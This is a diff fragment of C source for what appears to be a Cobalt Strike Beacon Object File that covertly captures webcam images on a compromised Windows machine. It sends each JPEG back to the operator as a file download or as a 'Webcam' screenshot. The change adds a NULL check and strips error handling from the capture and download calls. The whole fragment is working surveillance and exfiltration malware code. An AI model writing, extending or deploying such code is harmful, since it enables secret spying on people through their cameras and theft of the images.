@@ -1540,12 +1540,15 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
     free(packedData);
 }
 
-
 void go(char* buff, int len) {
     datap parser;
     BeaconDataParse(&parser, buff, len);
 
     char* filename = BeaconDataExtract(&parser, NULL);
+    if (filename == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT, "BeaconDataExtract returned NULL");
+        return;
+    }
     int savemethod = BeaconDataInt(&parser);
 
     if (!ResolveAPIs()) {
@@ -1582,13 +1585,7 @@ void go(char* buff, int len) {
     }
 
     unsigned int width = 0, height = 0;
-    // Assuming CWebcamAccess_GetImageSizes returns an HRESULT; otherwise, adjust as needed.
-    hr = CWebcamAccess_GetImageSizes(&wa, &width, &height);
-    if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_GetImageSizes failed: %s", filename);
-        CWebcamAccess_Destroy(&wa);
-        return;
-    }
+    CWebcamAccess_GetImageSizes(&wa, &width, &height);
     
     int buflen = width * height * 4;
     BYTE* buf = (BYTE*)malloc(buflen);
@@ -1653,9 +1650,7 @@ void go(char* buff, int len) {
     }
     else if (savemethod == 1) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading JPEG over beacon as a file with filename %s", filename);
-        if (!downloadFile(filename, (int)strlen(filename), (char*)jpegData, (int)jpegSize)) {
-            BeaconPrintf(CALLBACK_OUTPUT, "downloadFile failed: %s", filename);
-        }
+        downloadFile(filename, (int)strlen(filename), (char*)jpegData, (int)jpegSize);
     }
     else if (savemethod == 2) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading JPEG over beacon as a screenshot");
@@ -1674,9 +1669,7 @@ void go(char* buff, int len) {
         char title[] = "Webcam";
         int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
         int titleLength = MSVCRT$_snprintf(NULL, 0, "%s", title);
-        if (!downloadScreenshot((char*)jpegData, (int)jpegSize, session, title, titleLength, user, userLength)) {
-            BeaconPrintf(CALLBACK_OUTPUT, "downloadScreenshot failed: %s", filename);
-        }
+        downloadScreenshot((char*)jpegData, (int)jpegSize, session, title, titleLength, user, userLength);
     }
 
     DeleteObject(hBitmap);
@@ -1684,6 +1677,7 @@ void go(char* buff, int len) {
     free(buf);
     CWebcamAccess_Destroy(&wa);
 }
+
 
 
 
